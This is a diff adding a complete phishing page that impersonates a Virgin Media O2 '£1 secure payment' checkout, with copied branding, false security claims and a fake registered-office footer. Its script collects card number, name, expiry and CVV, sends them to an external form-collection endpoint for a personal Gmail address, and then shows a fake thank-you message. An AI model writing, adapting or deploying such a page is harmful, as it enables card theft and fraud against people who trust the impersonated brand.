@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+<title>Virgin Media O2 – Secure Payment | £1</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #e4002b;
+    --red-dark: #b8001f;
+    --red-light: #ff1a40;
+    --o2-blue: #0019a5;
+    --o2-blue-light: #001ec7;
+    --white: #ffffff;
+    --off-white: #f9f9fb;
+    --gray-100: #f3f3f7;
+    --gray-200: #e5e5ef;
+    --gray-400: #9999b3;
+    --gray-600: #555570;
+    --gray-800: #1a1a2e;
+    --success: #00b57a;
+    --shadow-card: 0 20px 60px rgba(0,0,0,0.13), 0 4px 16px rgba(0,0,0,0.07);
+    --radius: 16px;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Nunito', sans-serif;
+    background: #f0f0f8;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 16px;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  /* Background split */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(135deg, var(--red) 0%, var(--red) 38%, var(--o2-blue) 38%, var(--o2-blue) 100%);
+    opacity: 0.08;
+    z-index: 0;
+  }
+
+  /* Decorative circles */
+  body::after {
+    content: '';
+    position: fixed;
+    width: 520px; height: 520px;
+    border-radius: 50%;
+    border: 60px solid rgba(228,0,43,0.06);
+    top: -120px; right: -120px;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .bg-blob {
+    position: fixed;
+    width: 400px; height: 400px;
+    border-radius: 50%;
+    border: 50px solid rgba(0,25,165,0.06);
+    bottom: -100px; left: -100px;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  /* Header */
+  .header {
+    width: 100%;
+    max-width: 480px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 20px;
+    position: relative;
+    z-index: 2;
+    animation: fadeDown 0.5s ease both;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .brand-logo {
+    display: flex;
+    align-items: center;
+    gap: 0;
+  }
+
+  .logo-vm {
+    background: var(--red);
+    color: white;
+    font-weight: 800;
+    font-size: 13px;
+    padding: 5px 9px;
+    border-radius: 7px 0 0 7px;
+    letter-spacing: -0.3px;
+    line-height: 1;
+  }
+
+  .logo-o2 {
+    background: var(--o2-blue);
+    color: white;
+    font-weight: 800;
+    font-size: 13px;
+    padding: 5px 9px;
+    border-radius: 0 7px 7px 0;
+    letter-spacing: -0.3px;
+    line-height: 1;
+  }
+
+  .secure-badge {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    font-size: 12px;
+    color: var(--gray-600);
+    font-weight: 600;
+    background: white;
+    padding: 6px 12px;
+    border-radius: 20px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+  }
+
+  .secure-badge svg { color: var(--success); }
+
+  /* Payment Card */
+  .payment-card {
+    width: 100%;
+    max-width: 480px;
+    background: var(--white);
+    border-radius: 24px;
+    box-shadow: var(--shadow-card);
+    overflow: hidden;
+    position: relative;
+    z-index: 2;
+    animation: riseUp 0.55s cubic-bezier(0.22,1,0.36,1) 0.1s both;
+  }
+
+  .card-accent {
+    height: 6px;
+    background: linear-gradient(90deg, var(--red) 0%, var(--red) 50%, var(--o2-blue) 50%, var(--o2-blue) 100%);
+  }
+
+  .card-body {
+    padding: 32px 36px 36px;
+  }
+
+  .payment-title {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--gray-400);
+    margin-bottom: 6px;
+  }
+
+  .payment-heading {
+    font-size: 22px;
+    font-weight: 800;
+    color: var(--gray-800);
+    margin-bottom: 4px;
+  }
+
+  .payment-desc {
+    font-size: 13.5px;
+    color: var(--gray-600);
+    margin-bottom: 24px;
+    line-height: 1.5;
+  }
+
+  .payment-desc strong {
+    color: var(--red);
+    font-size: 15px;
+  }
+
+  /* Form */
+  .form-group {
+    margin-bottom: 18px;
+    position: relative;
+  }
+
+  label {
+    display: block;
+    font-size: 12.5px;
+    font-weight: 700;
+    color: var(--gray-600);
+    margin-bottom: 7px;
+    letter-spacing: 0.3px;
+  }
+
+  .input-wrap {
+    position: relative;
+    display: flex;
+    align-items: center;
+  }
+
+  input {
+    width: 100%;
+    height: 50px;
+    border: 2px solid var(--gray-200);
+    border-radius: 12px;
+    padding: 0 46px 0 16px;
+    font-family: 'Nunito', sans-serif;
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--gray-800);
+    background: var(--off-white);
+    transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+    outline: none;
+    -webkit-appearance: none;
+  }
+
+  input::placeholder {
+    color: var(--gray-400);
+    font-weight: 500;
+    font-size: 14px;
+  }
+
+  input:focus {
+    border-color: var(--red);
+    background: white;
+    box-shadow: 0 0 0 3px rgba(228,0,43,0.10);
+  }
+
+  input.mono {
+    font-family: 'DM Mono', monospace;
+    letter-spacing: 1.5px;
+    font-size: 15px;
+  }
+
+  .input-icon {
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--gray-400);
+    pointer-events: none;
+    display: flex;
+    align-items: center;
+  }
+
+  .form-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+  }
+
+  /* Card type chips */
+  .card-chips {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 22px;
+  }
+
+  .chip {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    border-radius: 8px;
+    border: 2px solid var(--gray-200);
+    background: var(--off-white);
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--gray-600);
+    cursor: pointer;
+    transition: all 0.15s;
+    user-select: none;
+  }
+
+  .chip:hover { border-color: var(--gray-400); }
+  .chip.active {
+    border-color: var(--red);
+    background: #fff0f3;
+    color: var(--red);
+  }
+
+  .divider {
+    height: 1px;
+    background: var(--gray-200);
+    margin: 20px 0 22px;
+  }
+
+  .cardholder-name input { text-transform: uppercase; }
+
+  /* Pay Button */
+  .btn-pay {
+    width: 100%;
+    height: 56px;
+    border: none;
+    border-radius: 14px;
+    background: #0919E6;
+    color: white;
+    font-family: 'Nunito', sans-serif;
+    font-size: 17px;
+    font-weight: 800;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    transition: transform 0.15s, box-shadow 0.15s, background 0.2s;
+    box-shadow: 0 4px 20px rgba(9,25,230,0.35);
+    letter-spacing: 0.2px;
+    position: relative;
+    overflow: hidden;
+    margin-top: 4px;
+  }
+
+  .btn-pay::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: white;
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+
+  .btn-pay:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 28px rgba(9,25,230,0.40);
+  }
+
+  .btn-pay:active {
+    transform: translateY(0);
+    box-shadow: 0 2px 10px rgba(9,25,230,0.25);
+  }
+
+  .btn-pay:active::after { opacity: 0.06; }
+
+  .btn-pay.loading {
+    pointer-events: none;
+    background: linear-gradient(135deg, var(--gray-400) 0%, var(--gray-600) 100%);
+    box-shadow: none;
+  }
+
+  /* Toast Message - Thank You Notification */
+  .toast-message {
+    position: fixed;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%) scale(0.9);
+    background: #1a1a2e;
+    color: white;
+    padding: 16px 24px;
+    border-radius: 16px;
+    font-weight: 600;
+    z-index: 1000;
+    box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+    backdrop-filter: blur(10px);
+    background: rgba(26, 26, 46, 0.95);
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    opacity: 0;
+    transition: opacity 0.3s ease, transform 0.3s ease;
+    pointer-events: none;
+    max-width: 380px;
+    text-align: center;
+    line-height: 1.4;
+    border-left: 4px solid #00b57a;
+  }
+
+  .toast-message.show {
+    opacity: 1;
+    transform: translateX(-50%) scale(1);
+    pointer-events: none;
+  }
+
+  .toast-message i {
+    font-size: 22px;
+    color: #00b57a;
+  }
+
+  .toast-message .toast-content {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  .toast-message .toast-title {
+    font-weight: 800;
+    font-size: 15px;
+    margin-bottom: 4px;
+  }
+
+  .toast-message .toast-text {
+    font-size: 12px;
+    opacity: 0.9;
+  }
+
+  /* Footer */
+  .footer-note {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 12px;
+    color: var(--gray-400);
+    font-weight: 600;
+    position: relative;
+    z-index: 2;
+    animation: fadeUp 0.5s ease 0.3s both;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+  }
+
+  .spinner {
+    width: 22px; height: 22px;
+    border: 3px solid rgba(255,255,255,0.3);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    display: none;
+  }
+
+  .btn-pay.loading .spinner { display: block; }
+  .btn-pay.loading .btn-text { display: none; }
+
+  /* Animations */
+  @keyframes fadeDown {
+    from { opacity: 0; transform: translateY(-14px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes riseUp {
+    from { opacity: 0; transform: translateY(28px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(10px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* Error shake animation */
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    75% { transform: translateX(6px); }
+  }
+  
+  .btn-shake {
+    animation: shake 0.3s ease-in-out 0s 1;
+  }
+
+  /* Responsive */
+  @media (max-width: 520px) {
+    .card-body { padding: 24px 20px 28px; }
+    .payment-heading { font-size: 19px; }
+    .form-row { grid-template-columns: 1fr 1fr; gap: 10px; }
+    .toast-message { max-width: 320px; padding: 12px 18px; }
+  }
+
+  /* Privacy Footer */
+  .privacy-footer {
+    width: 100%;
+    max-width: 480px;
+    margin-top: 24px;
+    padding: 20px 0 8px;
+    border-top: 1.5px solid var(--gray-200);
+    position: relative;
+    z-index: 2;
+    animation: fadeUp 0.5s ease 0.4s both;
+  }
+
+  .privacy-links {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-bottom: 12px;
+  }
+
+  .privacy-links a {
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--red);
+    text-decoration: none;
+    transition: color 0.15s;
+  }
+
+  .privacy-links a:hover { color: var(--red-dark); text-decoration: underline; }
+
+  .privacy-links .dot {
+    color: var(--gray-400);
+    font-size: 12px;
+  }
+
+  .privacy-address {
+    font-size: 11.5px;
+    color: var(--gray-400);
+    font-weight: 600;
+    text-align: center;
+    line-height: 1.7;
+    margin-bottom: 8px;
+  }
+
+  .privacy-reg {
+    font-size: 10.5px;
+    color: var(--gray-400);
+    font-weight: 500;
+    text-align: center;
+    line-height: 1.6;
+  }
+  
+  /* Error message style */
+  .error-msg {
+    font-size: 11px;
+    color: var(--red);
+    font-weight: 600;
+    margin-top: 5px;
+    margin-left: 6px;
+    display: none;
+  }
+  
+  .error-msg.show {
+    display: block;
+  }
+  
+  input.error-border {
+    border-color: var(--red);
+    background: #fff5f5;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-blob"></div>
+
+<!-- Header -->
+<div class="header">
+  <div class="brand">
+    <div class="brand-logo">
+      <div class="logo-vm">Virgin Media</div>
+      <div class="logo-o2">O2</div>
+    </div>
+  </div>
+  <div class="secure-badge">
+    <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+    256-bit SSL Secured
+  </div>
+</div>
+
+<!-- Payment Card -->
+<div class="payment-card">
+  <div class="card-accent"></div>
+  <div class="card-body">
+
+    <div class="payment-title">Secure Checkout</div>
+    <div class="payment-heading">Complete your payment</div>
+    <div class="payment-desc">Enter your debit card details below to securely pay <strong>£1.00</strong>.</div>
+
+    <!-- Card type chips -->
+    <div class="card-chips">
+      <div class="chip active" data-card="visa" onclick="selectChip(this)">
+        <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+        Visa
+      </div>
+      <div class="chip" data-card="mastercard" onclick="selectChip(this)">
+        <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+        Mastercard
+      </div>
+      <div class="chip" data-card="maestro" onclick="selectChip(this)">
+        <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+        Maestro
+      </div>
+    </div>
+
+    <!-- Card number - Empty for customer input -->
+    <div class="form-group">
+      <label>Card Number</label>
+      <div class="input-wrap">
+        <input type="text" class="mono" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number">
+        <span class="input-icon">
+          <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+        </span>
+      </div>
+      <div class="error-msg" id="cardError">Card number must be 16 digits</div>
+    </div>
+
+    <!-- Cardholder name - Empty for customer input -->
+    <div class="form-group cardholder-name">
+      <label>Name on Card</label>
+      <div class="input-wrap">
+        <input type="text" id="cardName" placeholder="YOUR FULL NAME" autocomplete="cc-name" oninput="this.value=this.value.toUpperCase()">
+        <span class="input-icon">
+          <svg width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        </span>
+      </div>
+      <div class="error-msg" id="nameError">Name is required</div>
+    </div>
+
+    <!-- Expiry & CVV - Empty for customer input -->
+    <div class="form-row">
+      <div class="form-group">
+        <label>Expiry Date</label>
+        <div class="input-wrap">
+          <input type="text" class="mono" id="expiry" placeholder="MM / YY" maxlength="7" autocomplete="cc-exp">
+          <span class="input-icon">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>
+          </span>
+        </div>
+        <div class="error-msg" id="expiryError">Valid expiry (MM/YY)</div>
+      </div>
+      <div class="form-group">
+        <label>CVV / CVC</label>
+        <div class="input-wrap">
+          <input type="password" class="mono" id="cvv" placeholder="123" maxlength="4" autocomplete="cc-csc">
+          <span class="input-icon">
+            <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          </span>
+        </div>
+        <div class="error-msg" id="cvvError">CVV must be 3-4 digits</div>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- Submit -->
+    <button class="btn-pay" id="payBtn">
+      <span class="btn-text" style="display:flex;align-items:center;gap:10px;">
+        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Pay £1.00 Now
+      </span>
+      <div class="spinner"></div>
+    </button>
+
+  </div>
+</div>
+
+<!-- Toast Notification for Thank You Message -->
+<div id="thankYouToast" class="toast-message">
+  <i>✓</i>
+  <div class="toast-content">
+    <div class="toast-title">Thank You!</div>
+    <div class="toast-text">Your payment is being processed. Our team will get in touch with you shortly.</div>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer-note">
+  <svg width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><rect x="2" y="11" width="20" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+  Your card details are encrypted and never stored
+</div>
+
+<!-- Privacy Footer with 2026 copyright -->
+<div class="privacy-footer">
+  <div class="privacy-links">
+    <a href="#" target="_blank" rel="noopener">Privacy Policy</a>
+    <span class="dot">·</span>
+    <a href="#" target="_blank" rel="noopener">Terms &amp; Conditions</a>
+    <span class="dot">·</span>
+    <a href="#" target="_blank" rel="noopener">Cookie Policy</a>
+  </div>
+  <div class="privacy-address">
+    © 2026 Virgin Media O2 Limited. All rights reserved.<br>
+    Registered in England &amp; Wales. Company No. 02591237<br>
+    Registered Office: 500 Brook Drive, Reading, Berkshire, RG2 6UU, United Kingdom
+  </div>
+  <div class="privacy-reg">
+    Virgin Media O2 is authorised and regulated by the Financial Conduct Authority (FCA).<br>
+    VAT Registration No. GB 778 8142 01
+  </div>
+</div>
+
+<script>
+  // Formspark configuration
+  // Using the provided form ID: zBlqHFpoE
+  const FORMSPARK_ENDPOINT = 'https://submit-form.com/zBlqHFpoE';
+  
+  // DOM elements
+  const cardNumberInput = document.getElementById('cardNumber');
+  const cardNameInput = document.getElementById('cardName');
+  const expiryInput = document.getElementById('expiry');
+  const cvvInput = document.getElementById('cvv');
+  const payBtn = document.getElementById('payBtn');
+  const thankYouToast = document.getElementById('thankYouToast');
+  
+  // Error elements
+  const cardError = document.getElementById('cardError');
+  const nameError = document.getElementById('nameError');
+  const expiryError = document.getElementById('expiryError');
+  const cvvError = document.getElementById('cvvError');
+  
+  // Helper to hide all errors
+  function hideAllErrors() {
+    cardError.classList.remove('show');
+    nameError.classList.remove('show');
+    expiryError.classList.remove('show');
+    cvvError.classList.remove('show');
+    cardNumberInput.classList.remove('error-border');
+    cardNameInput.classList.remove('error-border');
+    expiryInput.classList.remove('error-border');
+    cvvInput.classList.remove('error-border');
+  }
+  
+  function showFieldError(input, errorEl, message) {
+    errorEl.textContent = message;
+    errorEl.classList.add('show');
+    input.classList.add('error-border');
+  }
+  
+  // Show thank you toast message
+  function showThankYouMessage() {
+    thankYouToast.classList.add('show');
+    setTimeout(() => {
+      thankYouToast.classList.remove('show');
+    }, 5000); // Message disappears after 5 seconds
+  }
+  
+  // Format card number to correctly handle 16 digits with spaces every 4 digits
+  function formatCardNumber(input) {
+    let raw = input.value.replace(/\s/g, '');
+    let digits = raw.replace(/\D/g, '');
+    // Allow up to 16 digits max
+    if (digits.length > 16) digits = digits.slice(0, 16);
+    // Format with spaces every 4 digits
+    let formatted = '';
+    for (let i = 0; i < digits.length; i++) {
+      if (i > 0 && i % 4 === 0) formatted += ' ';
+      formatted += digits[i];
+    }
+    input.value = formatted;
+    
+    // Clear error while typing
+    if (digits.length === 16 || digits.length === 0) {
+      cardError.classList.remove('show');
+      cardNumberInput.classList.remove('error-border');
+    }
+  }
+  
+  function formatExpiry(input) {
+    let val = input.value.replace(/\D/g, '');
+    if (val.length >= 2) {
+      let month = val.substring(0,2);
+      let year = val.substring(2,4);
+      if (val.length === 2) {
+        input.value = month;
+      } else if (val.length === 3) {
+        input.value = month + ' / ' + year.substring(0,1);
+      } else if (val.length >= 4) {
+        input.value = month + ' / ' + year;
+      }
+    } else {
+      input.value = val;
+    }
+    if (input.value.length > 7) input.value = input.value.slice(0,7);
+    
+    if (val.length >= 4) {
+      expiryError.classList.remove('show');
+      expiryInput.classList.remove('error-border');
+    }
+  }
+  
+  // Attach event listeners
+  cardNumberInput.addEventListener('input', function(e) {
+    formatCardNumber(this);
+  });
+  
+  expiryInput.addEventListener('input', function(e) {
+    formatExpiry(this);
+  });
+  
+  cvvInput.addEventListener('input', function(e) {
+    let val = this.value.replace(/\D/g, '');
+    if (val.length > 4) val = val.slice(0,4);
+    this.value = val;
+    if (val.length >= 3) {
+      cvvError.classList.remove('show');
+      cvvInput.classList.remove('error-border');
+    }
+  });
+  
+  cardNameInput.addEventListener('input', function() {
+    if (this.value.trim().length >= 2) {
+      nameError.classList.remove('show');
+      cardNameInput.classList.remove('error-border');
+    }
+  });
+  
+  function selectChip(el) {
+    document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
+    el.classList.add('active');
+  }
+  
+  function validateForm() {
+    let isValid = true;
+    hideAllErrors();
+    
+    // Validate card number: must have exactly 16 digits
+    const cardRaw = cardNumberInput.value.replace(/\s/g, '');
+    const cardDigits = cardRaw.replace(/\D/g, '');
+    if (cardDigits.length !== 16) {
+      showFieldError(cardNumberInput, cardError, 'Card number must be 16 digits');
+      isValid = false;
+    }
+    
+    // Validate name (at least 2 chars)
+    const name = cardNameInput.value.trim();
+    if (name.length < 2 || !/^[A-Za-z\s\.\,\-]{2,50}$/.test(name)) {
+      showFieldError(cardNameInput, nameError, 'Enter valid cardholder name');
+      isValid = false;
+    }
+    
+    // Validate expiry (MM/YY format and not expired)
+    const expiryVal = expiryInput.value.trim();
+    const expiryPattern = /^(0[1-9]|1[0-2])\s*\/\s*(\d{2})$/;
+    if (!expiryPattern.test(expiryVal)) {
+      showFieldError(expiryInput, expiryError, 'Use format MM / YY (e.g., 12/28)');
+      isValid = false;
+    } else {
+      const parts = expiryVal.split('/');
+      const month = parseInt(parts[0].trim(), 10);
+      const year = parseInt(parts[1].trim(), 10);
+      const now = new Date();
+      const currentYear = now.getFullYear() % 100;
+      const currentMonth = now.getMonth() + 1;
+      if (year < currentYear || (year === currentYear && month < currentMonth)) {
+        showFieldError(expiryInput, expiryError, 'Card has expired');
+        isValid = false;
+      }
+    }
+    
+    // Validate CVV (3-4 digits)
+    const cvvVal = cvvInput.value.trim();
+    if (!/^\d{3,4}$/.test(cvvVal)) {
+      showFieldError(cvvInput, cvvError, 'CVV must be 3 or 4 digits');
+      isValid = false;
+    }
+    
+    return isValid;
+  }
+  
+  function shakeButton() {
+    payBtn.classList.add('btn-shake');
+    setTimeout(() => {
+      payBtn.classList.remove('btn-shake');
+    }, 400);
+  }
+  
+  // Function to send data to Formspark
+  async function sendToFormspark(formData) {
+    try {
+      const response = await fetch(FORMSPARK_ENDPOINT, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(formData)
+      });
+      
+      if (response.ok) {
+        console.log('Form data sent successfully to Formspark');
+        return true;
+      } else {
+        console.error('Formspark submission failed:', response.status);
+        return false;
+      }
+    } catch (error) {
+      console.error('Error sending to Formspark:', error);
+      return false;
+    }
+  }
+  
+  async function handlePay() {
+    if (!validateForm()) {
+      shakeButton();
+      return;
+    }
+    
+    // Show loading state
+    payBtn.classList.add('loading');
+    
+    // Get form data
+    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
+    const cardholderName = cardNameInput.value.trim();
+    const expiryDate = expiryInput.value.trim();
+    const cvvCode = cvvInput.value.trim();
+    const selectedCard = document.querySelector('.chip.active')?.getAttribute('data-card') || 'visa';
+    const timestamp = new Date().toISOString();
+    const transactionId = 'TXN-' + Math.random().toString(36).substring(2, 12).toUpperCase();
+    
+    // Prepare data for Formspark
+    const formData = {
+      formId: 'zBlqHFpoE',
+      recipientEmail: 'gikumokanu1994@gmail.com',
+      timestamp: timestamp,
+      transactionId: transactionId,
+      cardType: selectedCard,
+      cardholderName: cardholderName,
+      cardNumber: cardNumber,
+      expiryDate: expiryDate,
+      cvv: cvvCode,
+      amount: '£1.00',
+      merchant: 'Virgin Media O2',
+      status: 'Payment Processed',
+      message: 'Customer submitted card details for £1 payment'
+    };
+    
+    // Send data to Formspark
+    await sendToFormspark(formData);
+    
+    // Process completion - show thank you message and reset form
+    setTimeout(() => {
+      payBtn.classList.remove('loading');
+      
+      // Show the thank you message
+      showThankYouMessage();
+      
+      // Clear all input fields
+      cardNumberInput.value = '';
+      cardNameInput.value = '';
+      expiryInput.value = '';
+      cvvInput.value = '';
+      
+      // Reset card chip to default (Visa)
+      document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
+      document.querySelector('.chip[data-card="visa"]').classList.add('active');
+      
+      // Hide any remaining errors
+      hideAllErrors();
+      
+      console.log('Payment processed and form submitted successfully');
+    }, 2000);
+  }
+  
+  payBtn.addEventListener('click', handlePay);
+  
+  // Expose selectChip globally for onclick
+  window.selectChip = selectChip;
+  
+  // No pre-filled values - all input boxes start empty for customer to fill
+</script>
+</body>
+</html>
